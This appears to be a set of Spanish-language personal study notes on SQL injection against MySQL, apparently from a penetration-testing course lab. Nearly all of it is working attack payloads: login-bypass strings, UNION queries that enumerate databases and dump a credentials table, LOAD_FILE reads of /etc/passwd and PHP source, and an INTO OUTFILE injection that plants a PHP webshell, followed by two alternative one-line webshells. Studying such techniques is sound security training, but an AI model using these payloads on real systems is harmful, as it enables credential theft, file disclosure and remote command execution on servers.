![[Pasted image 20251109135511.jpg]]

# SQLi Discovery

| Payload | URL Encoded |
| ------- | ----------- |
| '       | %27         |
| ""      | %22         |
| #       | %23         |
| ;       | %3B         |
| )       | %29         |

## Payloads Típicos

```
admin' OR '1'='1
```

```
') OR 1=1-- -
```

```
' OR '1' = '1
```

```
' OR 1=1-- -
```

```
' OR id = 5)--
```

```
' UNION select 1,2,3,4-- -
```
Nos da esto:
![[Pasted image 20251109195759.png]]
Si cualquiera de esos números le ponemos en la consulta user() nos dará el usuario será una inyeccion UNION:
```
' UNION select 1,user(),3,4-- -
```
![[Pasted image 20251109195913.png]]


## Enumeración de la base de datos
```
SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;
```

Schemata es la tabla de information_schema la cual tiene la información de todas las bases de datos presentes en el servidor así que esta será nuestro objetivo para enumerar. En los siguientes comandos si no funciona ya sabemos como funciona la inyección UNION vamos añadiendo números hasta que coincida con el número que existe y nos de información
```
' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -
```
![[Pasted image 20251109201508.png]]

```
' UNION select 1,database(),2,3-- -
```

Una vez mas o menos identificado lo que queremos:
```
' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -
```
![[Pasted image 20251109201537.png]]
Ponemos table_name y table_schema que nos interesa para coger el output de las dos y ponemos where y la tabla 'dev' por que nos interesaria y si lo pusiéramos sin ese where nos daría todas las tablas del servidor y podrían ser muchísimas.


Ahora para dumpear la tabla de credenciales primero necesitamos saber los nombres de las columnas, vamos a hacerlo con:
```
' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -
```
![[Pasted image 20251109201549.png]]

Ahora que tenemos toda la información, podemos formular nuestra `UNION`consulta para extraer los datos de las columnas ` `username`a` y `b` de la tabla en la base de datos. Podemos colocar ` a` y `b` en lugar de las columnas 2 y 3:`password``credentials``dev``username``password`
```
' UNION select 1, username, password, 4 from dev.credentials-- -
```
![[Pasted image 20251109201600.png]]

## Para leer ficheros

Para ello necesitaremos que el usuario de la base de datos que tenemos tenga permisos de FILE, obviamente si es un usuario administrador nos aseguramos esto.

### Primero necesitaremos el nombre de nuestro usuario
Las consultas normales en la base de datos serían:
```
SELECT USER()
SELECT CURRENT_USER()
SELECT user from mysql.user
```

En versión inyection tenemos dos opciones
```
' UNION SELECT 1, user(), 3, 4-- -
```
o
```
' UNION SELECT 1, user, 3, 4 from mysql.user-- -
```
(Como hemos hecho antes en la prueba de la inyección UNION)

### Después del nombre los privilegios que tenemos
La consulta normal sería:
```
SELECT super_priv FROM mysql.user
```

La inyección:
```
' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user-- -
```
La "Y" significa YES y que es admin

Si hay muchos usuarios podemos filtrar con:
```
' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -
```

Podemos dumpear los privilegios desde el schema:
```
' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges-- -
```
y filtrando para solo root users:
```
' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -
```

### Para leer los ficheros ahora que sabemos los privilegios que tenemos

La consulta normal sería:
```
SELECT LOAD_FILE('/etc/passwd');
```

La inyección:
```
' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -
```

Otro ejemplos sería:
```
' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -
```
Como los archivos así rompen la página pulsaremos CTRL+U para ver el código fuente y poder visualizarlo correctamente

## Para escribir ficheros

Necesitamos tres cosas:

1. Permisos de FILE, obviamente si es un usuario administrador nos aseguramos esto.

2. Que no este la variable global de MySQL  "secure_file_priv" habilitada.

3. Acceso de escritura a la ubicación en la que queremos escribir en el servidor backend.

La variable `secure_file_priv` se utiliza para determinar desde dónde leer y escribir archivos. Un valor vacío permite leer archivos de todo el sistema de archivos. De lo contrario, si se especifica un directorio, solo se podrá leer desde la carpeta indicada por la variable.

Las consultas normales:
```
SHOW VARIABLES LIKE 'secure_file_priv';
```
o
```
SELECT variable_name, variable_value FROM information_schema.global_variables where variable_name="secure_file_priv"
```

Con la inyección:
```
' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -
```
Si aparece el valor vació significa que tenemos los permisos adecuados.

### Seleccionamos el fichero de salida

La consulta normal sería:
```
SELECT * from users INTO OUTFILE '/tmp/credentials';
```
Ahora con `cat /tmp/credentials` podemos ver el contenido.

Otro ejemplo
```
SELECT 'this is a test' INTO OUTFILE '/tmp/test.txt';
```
Y con `cat /tmp/test.txt` podremos ver que se ha escrito "this is a test correctamente"

Las exportaciones de archivos avanzadas utilizan la función 'FROM_BASE64("base64_data")' para poder escribir archivos largos

#### Ahora bien mediante la inyección sería:
```
' union select 1,'file written successfully!',3,4 into outfile '/var/www/html/proof.txt'-- -
```

Por ejemplo podríamos escribir una webshell con:
```
' union select "",'<?php system($_REQUEST[X]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -
```
Al subirla veremos que "no pasa nada" , pero eso es buena señal, no ha habido error y el archivo se ha creado correctamente.

Ahora desde http://SERVER_IP:PORT/shell.php?X=id

SI NO FUNCIONA ESAZ WEBSHELL PODEMOS PROBAR CON ESTAS:
```
<?php system($_GET['x']); ?>
```
Esta y la de antes puede fallar si no esta la función de php system habilitada, pero para este caso tenemos el siguiente:

```
<?=`$_GET[x]`?>
```
